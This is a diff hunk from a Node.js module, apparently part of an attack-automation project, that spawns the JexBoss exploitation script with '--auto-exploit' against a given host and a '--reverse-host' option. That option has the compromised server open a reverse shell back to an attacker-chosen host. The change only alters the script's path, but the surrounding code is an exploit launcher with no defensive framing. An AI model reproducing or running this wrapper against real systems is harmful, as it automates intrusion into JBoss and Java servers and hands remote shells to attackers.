@@ -25,7 +25,7 @@ module.exports = function(host,reverseHost,callback) {
 
 
 
-    const jexboss = spawn('python', ['/exploit/jexboss/jexboss.py', '--auto-exploit', '-host', host,
+    const jexboss = spawn('python', ['./exploit/jexboss/jexboss.py', '--auto-exploit', '-host', host,
         '--reverse-host', reverseHost]);
 
     jexboss.stdout.on('data', (data) => {
